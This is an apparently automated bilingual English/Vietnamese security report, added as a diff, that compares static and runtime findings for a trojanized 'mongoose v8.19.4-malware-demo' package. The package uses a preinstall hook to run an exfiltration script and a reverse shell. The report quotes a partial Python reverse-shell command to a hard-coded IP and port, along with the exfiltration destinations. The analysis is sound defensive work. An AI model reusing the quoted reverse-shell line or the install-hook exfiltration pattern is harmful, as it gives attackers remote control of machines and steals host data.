@@ -1,0 +1,294 @@
+====================================================================================================
+VERIFICATION REPORT - STATIC vs DYNAMIC ANALYSIS COMPARISON
+BÁO CÁO XÁC MINH - SO SÁNH PHÂN TÍCH TĨNH VÀ ĐỘNG
+====================================================================================================
+
+Generated: 2025-11-27 23:51:25
+Repository: ../mongoose
+Version: v8.19.4-malware-demo
+
+====================================================================================================
+VERIFICATION SUMMARY / TÓNG KẾT XÁC MINH
+====================================================================================================
+
+✅ CONFIRMED Findings (Xác nhận): 3
+   - Both static analysis and dynamic runtime behavior agree
+   - High confidence security issues
+
+⚠️  SUSPICIOUS Static-Only (Nghi ngờ - chỉ tĩnh): 25
+   - Detected in code but not observed at runtime
+   - May be false positives or conditional vulnerabilities
+
+⚠️  SUSPICIOUS Dynamic-Only (Nghi ngờ - chỉ động): 0
+   - Observed at runtime but not predicted by static analysis
+   - May indicate sophisticated evasion or analysis gaps
+
+====================================================================================================
+LLM SECURITY ANALYSIS / PHÂN TÍCH BẢO MẬT
+====================================================================================================
+1. Executive Summary / Tóm tắt điều hành  
+------------------------------------------------  
+English:  
+Our security analysis uncovered a total of 31 findings across both static (28) and dynamic (3) inspections. Of these, 3 were confirmed by both methods, all involving outbound connections to attacker-controlled infrastructure: two HTTPS exfiltration endpoints and one reverse shell session. The remaining 28 are suspicious indicators hidden in code or configuration, including malicious lifecycle scripts, hard-coded C2 endpoints, and metadata tampering. The confirmed issues pose a CRITICAL risk of data exfiltration and remote compromise. Immediate remediation is required to remove or disable malicious scripts, lock down supply-chain integrity, and strengthen environment-variable handling.  
+
+Tiếng Việt:  
+Phân tích bảo mật của chúng tôi đã phát hiện tổng cộng 31 vấn đề, trong đó 28 qua phân tích tĩnh và 3 qua phân tích động. Ba trong số đó được xác nhận cả tĩnh và động, đều liên quan đến kết nối ra ngoài tới cơ sở hạ tầng do kẻ tấn công kiểm soát: hai endpoint HTTPS để rò rỉ dữ liệu và một phiên shell ngược (reverse shell). 28 vấn đề còn lại là dấu hiệu đáng ngờ trong mã nguồn hoặc cấu hình, bao gồm script lifecycle độc hại, C2 mã hoá cứng, và chỉnh sửa metadata bất thường. Các vấn đề xác nhận được xếp mức CRITICAL, có nguy cơ cao rò rỉ dữ liệu và kiểm soát hệ thống từ xa. Cần khắc phục ngay lập tức để loại bỏ hoặc vô hiệu hoá script độc hại, củng cố tính toàn vẹn chuỗi cung ứng, và tăng cường quản lý biến môi trường.  
+
+2. Risk Assessment / Đánh giá rủi ro  
+----------------------------------------------  
+English:  
+• Critical (Confirmed ×3): Outbound POST to oastify.com (54.77.139.23, 3.248.33.252) exfiltrates system and package metadata; reverse shell to 77.244.210.247 on port 22857.  
+• High (Static-only ×?): Preinstall lifecycle script executing arbitrary code, hard-coded C2 endpoints in shell script.  
+• Medium/Low: Metadata tampering, non-standard version tags, direct exposure of env vars in docs, potential supply-chain confusion.  
+
+Overall Risk: Critical for immediate removal of confirmed malware; High for unauthorized code execution; Medium/Low for policy compliance and best-practice issues.  
+
+Tiếng Việt:  
+• Mức độ Critical (Xác nhận ×3): POST ra oastify.com (54.77.139.23, 3.248.33.252) để rò rỉ metadata hệ thống và package; reverse shell tới 77.244.210.247:22857.  
+• Mức độ High (Chỉ tĩnh): Script preinstall thực thi mã tuỳ ý, C2 endpoint mã hoá cứng trong shell script.  
+• Mức độ Medium/Low: Chỉnh sửa metadata, tag version không chuẩn, lộ biến môi trường trong tài liệu, khả năng nhầm lẫn chuỗi cung ứng.  
+
+Tổng quan Rủi ro: Critical đối với malware xác nhận; High đối với thực thi code bất hợp pháp; Medium/Low đối với tuân thủ chính sách và thực hành.  
+
+3. Detailed Findings / Chi tiết phát hiện  
+-----------------------------------------------------  
+A. Confirmed Findings (Static + Dynamic)  
+1. CRITICAL – HTTPS Exfiltration (malware_exfil.js)  
+   - Static: Outbound POST to oastify.com sending home directory, hostname, username, DNS, full package.json.  
+   - Dynamic: node → 54.77.139.23:0 and node → 3.248.33.252:0.  
+
+2. CRITICAL – HTTPS Exfiltration (duplicate endpoint)  
+   - Same as #1 but observed second IP. Indicates load-balanced or fallback infrastructure.  
+
+3. HIGH – Reverse Shell (main_reverse_shell.sh)  
+   - Static: Hard-coded IP 77.244.210.247 across multiple ports, multiple interpreter fallbacks.  
+   - Dynamic: python3 → 77.244.210.247:22857 establishes interactive shell.  
+
+B. Suspicious Static-only Findings (Selected by Severity)  
+• CRITICAL  
+  – package.json preinstall script runs malware_exfil.js and main_reverse_shell.sh.  
+  – main_reverse_shell.sh supports piping remote scripts into shell (curl … | sh).  
+
+• HIGH  
+  – supply_chain_tampering: version suffix “-malware-demo” inserted.  
+  – unsafe environment access in malware_exfil.js (reading home, user, DNS).  
+  – docs/nextjs.md calls mongoose.connect(MONGODB_URI) without sanitization.  
+
+• MEDIUM  
+  – Metadata mismatch: commit author ≠ package author.  
+  – Direct reading of process.env keys in documentation blocks.  
+  – Non-semver version tags risk unexpected package resolution.  
+
+• LOW  
+  – Presence of human-readable labels in version fields.  
+  – Comments or leftover demo code in readmes.  
+
+4. Remediation Recommendations / Khuyến nghị khắc phục  
+----------------------------------------------------------------  
+English:  
+1. Immediate Removal: Strip out preinstall scripts in package.json and delete malware_exfil.js, main_reverse_shell.sh from all branches and releases.  
+2. Rotate Credentials & Environment Variables: Invalidate any leaked keys or URIs; enforce least-privilege on MONGODB_URI and similar.  
+3. Supply-chain Lockdown: Implement package integrity checks (SHA-512 signatures), enforce strict semantic versioning, restrict commit rights.  
+4. Network Egress Controls: Block egress to unknown IPs/domains at firewall or proxy. Monitor outbound HTTPS to atypical hosts.  
+5. Code Review & Hardening: Audit all lifecycle scripts; require peer review on package.json changes; sanitize environment inputs.  
+6. Monitoring & Incident Response: Deploy host-based IDS/IPS to detect reverse shells, unexpected child processes, and anomalous POST requests.  
+
+Tiếng Việt:  
+1. Xoá ngay lập tức: Loại bỏ script preinstall trong package.json và xoá malware_exfil.js, main_reverse_shell.sh khỏi mọi nhánh và bản phát hành.  
+2. Đổi mới thông tin xác thực & biến môi trường: Thu hồi tất cả khóa hoặc URI có thể bị rò; áp dụng nguyên tắc “ít đặc quyền” cho MONGODB_URI và tương tự.  
+3. Khóa chặt chuỗi cung ứng: Áp dụng kiểm tra tính toàn vẹn gói (ký SHA-512), tuân thủ nghiêm ngặt semver, giới hạn quyền commit.  
+4. Kiểm soát egress mạng: Chặn kết nối ra ngoài tới IP/đômain không xác định ở firewall hoặc proxy. Giám sát HTTPS ra các host bất thường.  
+5. Rà soát & gia cố mã nguồn: Kiểm tra kỹ script lifecycle; yêu cầu review bắt buộc cho mọi thay đổi package.json; sanitize dữ liệu đầu vào từ môi trường.  
+6. Giám sát & ứng phó: Triển khai IDS/IPS trên host để phát hiện reverse shell, tiến trình lạ và request POST bất thường.  
+
+5. Conclusion / Kết luận  
+--------------------------------  
+English:  
+The presence of confirmed exfiltration and reverse-shell mechanisms represents a severe breach of software integrity and confidentiality. Action must be taken immediately to eradicate malicious code, secure the supply chain, and institute robust controls on environment variables and network egress. Regular audits, strict versioning policies, and proactive monitoring will reduce future risk.  
+
+Tiếng Việt:  
+Việc phát hiện cơ chế rò rỉ dữ liệu và shell ngược xác nhận cho thấy tính toàn vẹn và bí mật của phần mềm đã bị vi phạm nghiêm trọng. Cần hành động ngay lập tức để xoá mã độc, bảo vệ chuỗi cung ứng, và thiết lập cơ chế kiểm soát biến môi trường cũng như lưu lượng ra ngoài chặt chẽ. Rà soát thường xuyên, chính sách versioning nghiêm ngặt và giám sát chủ động sẽ giảm thiểu rủi ro trong tương lai.
+
+====================================================================================================
+DETAILED VERIFIED FINDINGS / CHI TIẾT CÁC PHÁT HIỆN ĐÃ XÁC MINH
+====================================================================================================
+
+[1] ✅ CONFIRMED - CRITICAL
+Category: Suspicious Network Access
+
+STATIC ANALYSIS:
+  File: malware_exfil.js:24
+  Description: The script performs an outbound HTTPS POST to an external, likely attacker-controlled domain (oastify.com) sending sensitive system/package data. This is clear data exfiltration to an external service.
+
+DYNAMIC RUNTIME:
+  Process: node
+  Connection: 54.77.139.23:0
+  Command: node malware_exfil.js
+
+RECOMMENDATION:
+  Remove this network call. Do not allow arbitrary outbound connections in install scripts. If you need telemetry, implement opt-in, transparent mechanisms and document destinations. Block suspicious domains at network perimeter and investigate any hosts that contacted the domain.
+================================================================================
+
+[2] ✅ CONFIRMED - CRITICAL
+Category: Suspicious Network Access
+
+STATIC ANALYSIS:
+  File: malware_exfil.js:24
+  Description: The script performs an outbound HTTPS POST to an external, likely attacker-controlled domain (oastify.com) sending sensitive system/package data. This is clear data exfiltration to an external service.
+
+DYNAMIC RUNTIME:
+  Process: node
+  Connection: 3.248.33.252:0
+  Command: node malware_exfil.js
+
+RECOMMENDATION:
+  Remove this network call. Do not allow arbitrary outbound connections in install scripts. If you need telemetry, implement opt-in, transparent mechanisms and document destinations. Block suspicious domains at network perimeter and investigate any hosts that contacted the domain.
+================================================================================
+
+[3] ✅ CONFIRMED - HIGH
+Category: Suspicious Network Access
+
+STATIC ANALYSIS:
+  File: main_reverse_shell.sh:7
+  Description: The reverse shell connects to a hard-coded external IP address (77.244.210.247) across many ports. Hard-coded C2 endpoints in code are strong indicators of backdoor/malicious behavior.
+
+DYNAMIC RUNTIME:
+  Process: python3
+  Connection: 77.244.210.247:22857
+  Command: python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("77.244.210.247",22857)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=
+
+RECOMMENDATION:
+  Block the IP at network level and investigate any connections to it. Remove hard-coded remote hosts from repository. Treat any machine that contacted that IP as compromised.
+================================================================================
+
+====================================================================================================
+SUSPICIOUS STATIC-ONLY FINDINGS / PHÁT HIỆN NGHI NGỜ (CHỈ TĨNH)
+====================================================================================================
+
+[1] ⚠️  HIGH - supply_chain_tampering
+  File: package.json:4
+  The package version was changed to include the string "-malware-demo". This is a strong indicator that the package metadata (and possibly the package contents for that release) has been tampered with to denote a malicious or demo-malware release. A trojanized or maliciously labeled release of a popu
+
+
+[2] ⚠️  MEDIUM - metadata_tampering
+  File: package.json:5
+  The commit author (JakeClark) differs from the package author field (Guillermo Rauch). While not definitive proof of malicious intent, this mismatch combined with the suspicious version label indicates possible unauthorized modification of package metadata.
+
+
+[3] ⚠️  LOW - versioning_policy
+  File: package.json:4
+  The version string includes a non-standard suffix containing a human-readable label. Non-semver or unusual pre-release tags can cause unexpected resolution behavior in dependency managers and may be used to bypass simple automated filters that look for numeric version patterns.
+
+
+[4] ⚠️  CRITICAL - Command Execution
+  File: package.json:77
+  A preinstall script was added that runs a local Node script and then a shell script. This causes arbitrary code (malware_exfil.js and main_reverse_shell.sh) to execute automatically during npm install, enabling supply-chain compromise and remote code execution on any machine that installs the packag
+
+
+[5] ⚠️  CRITICAL - Data Leaks
+  File: malware_exfil.js:11
+  The script collects and transmits sensitive host/package data including home directory, hostname, username, DNS servers, and the full package.json contents. This exposes credentials, secrets, and identifying information.
+
+
+[6] ⚠️  CRITICAL - Command Execution
+  File: main_reverse_shell.sh:7
+  This script attempts to establish reverse shells using multiple interpreters and utilities (python, perl, nc, sh), connecting to a remote IP across a wide port range. If executed, it will provide remote interactive shell access to the attacker-controlled host, giving full system compromise.
+
+
+[7] ⚠️  CRITICAL - Code Injection
+  File: main_reverse_shell.sh:3
+  The file contains instructions and code that recommend piping remote content into a shell (curl ... | sh). This pattern is remote code execution by design and extremely dangerous.
+
+
+[8] ⚠️  HIGH - Unsafe Environment Variables
+  File: malware_exfil.js:1
+  The script executes during package lifecycle and reads local environment/host details (home directory, username, hostname). While not reading process.env directly, running this in an install context can expose environment-sensitive data and potentially secrets located in the home directory or config
+
+
+[9] ⚠️  HIGH - suspicious_network_access
+  File: docs/nextjs.md:24
+  The code calls mongoose.connect(MONGODB_URI) using a URI taken from the environment. If an attacker can influence MONGODB_URI (for example via a misconfigured environment in CI/CD, container injection, or a compromised host), they can point the application at an attacker-controlled MongoDB instance 
+
+
+[10] ⚠️  MEDIUM - unsafe_environment_variables
+  File: docs/nextjs.md:6
+  The code reads process.env.MONGODB_URI directly from a docs file code block. While reading env vars is normal, environment variables often contain sensitive credentials. If this documentation snippet is copied into runtime code or if environment variables are accidentally logged or exposed, secrets 
+
+
+[11] ⚠️  MEDIUM - suspicious_network_access
+  File: docs/nextjs.md:20
+  The previous implementation avoided creating a new connection when mongoose.connection.readyState >= 1. That guard was removed in this refactor. Always calling mongoose.connect without checking the existing connection state can lead to repeated connections (resource exhaustion) or unexpected reconne
+
+
+[12] ⚠️  HIGH - data_leaks
+  File: docs/nextjs.md:150
+  The documentation shows returning complete Mongoose documents (converted via JSON.parse(JSON.stringify(users))) as page props and sending them to the client. If the User model contains sensitive fields (password hashes, tokens, PII), those fields will be serialized and sent to the browser, causing s
+
+
+[13] ⚠️  MEDIUM - suspicious_network_access
+  File: docs/nextjs.md:24
+  The simplified dbConnect() removed the previous shared 'promise' caching pattern. With the new implementation, concurrent requests when no connection exists may each call mongoose.connect(), potentially creating multiple simultaneous connection attempts to the database. This can lead to connection s
+
+
+[14] ⚠️  MEDIUM - unsafe_environment_variables
+  File: docs/nextjs.md:5
+  The docs rely on MONGODB_URI environment variable to connect to the database. Connection URIs commonly contain embedded credentials. Documentation and example code must avoid printing, logging, or committing actual URIs or credentials, and should advise secure storage and restricted access.
+
+
+[15] ⚠️  LOW - data_leaks
+  File: docs/nextjs.md:134
+  The docs removed the .lean() call and now recommend JSON.parse(JSON.stringify(users)) for serialization. While this converts documents to plain objects, it can be inefficient and may inadvertently serialize non-enumerable or large nested structures, increasing memory usage and possibly causing large
+
+
+[16] ⚠️  HIGH - data_leaks
+  File: docs/nextjs.md:12
+  The examples return entire user documents directly to clients (e.g., res.status(200).json({ users }) and Response.json({ users })) which may include sensitive fields such as hashed passwords, API tokens, or other PII. Returning raw documents increases the risk of accidental exposure of sensitive dat
+
+
+[17] ⚠️  MEDIUM - code_injection
+  File: docs/nextjs.md:58
+  The example uses User.create(req.body) in an API route without validating or sanitizing req.body. Accepting and saving unvalidated client input into the database can lead to unwanted data being stored, logical injection of query operators (MongoDB query selector injection), or persistence of malicio
+
+
+[18] ⚠️  HIGH - unsafe_environment_variables
+  File: docs/nextjs.md:8
+  The code reads the database connection string from process.env.MONGODB_URI. If this environment variable is accidentally exposed to client bundles (for example by using NEXT_PUBLIC_ prefix or importing server-only modules into client components), the database credentials could be leaked. The docs al
+
+
+[19] ⚠️  MEDIUM - data_leaks
+  File: docs/nextjs.md:18
+  The Quick Start example serializes DB results for getServerSideProps using JSON.parse(JSON.stringify(users)). This pattern can inadvertently include fields that should not be sent to the client (e.g., internal metadata). It also does not protect against large payloads or nested sensitive fields that
+
+
+[20] ⚠️  LOW - suspicious_network_access
+  File: docs/nextjs.md:1
+  Documentation contains multiple external links to third-party resources (nextjs.org, mongoosejs.com, github.com, vercel.com). While these links are legitimate references, their presence is flagged as external network references which could be a vector for phishing if a malicious link were introduced
+
+
+[21] ⚠️  MEDIUM - suspicious_network_access
+  File: docs/schematypes.md:48
+  The documentation contains an explicit HTTP link to an external plugin search site. Using plain HTTP (instead of HTTPS) in documentation can lead readers to an insecure endpoint that is vulnerable to man-in-the-middle (MITM) attacks or DNS spoofing. Linking to an insecure external resource from offi
+
+
+[22] ⚠️  MEDIUM - code_injection
+  File: docs/schematypes.md:69
+  The new Union SchemaType documentation demonstrates that values (including user input) are automatically cast to the first successful type in the union and that Mongoose will cast query filters and updates according to the union types. Automatic coercion in queries can lead to unexpected query behav
+
+
+[23] ⚠️  LOW - suspicious_network_access
+  File: docs/faq.md:414
+  The documentation includes an external hyperlink to masteringjs.io. While linking to third-party resources in docs is common and usually harmless, external links can redirect users to untrusted content, enable tracking, or be abused for social engineering/phishing. The reported suspicious pattern in
+
+
+[24] ⚠️  MEDIUM - data_leaks
+  File: lib/schema.js:1698
+  Mutation of a potentially shared 'cast' object by assigning a reference to the parent schema (cast.parentSchema = this). If 'cast' is a shared type descriptor or reused object across schemas/models, this introduces stateful cross-object coupling that can lead to accidental information leakage, unexp
+
+
+[25] ⚠️  LOW - suspicious_network_access
+  File: lib/schema.js:1695
+  The code emits an error message that contains a shortened URL (https://bit.ly/mongoose-schematypes). Short URLs can obscure the real destination and are sometimes used in social engineering or to avoid automated filters. While this is only a message string (no network request is made by the code its
+
+====================================================================================================
+END OF VERIFICATION REPORT
+====================================================================================================
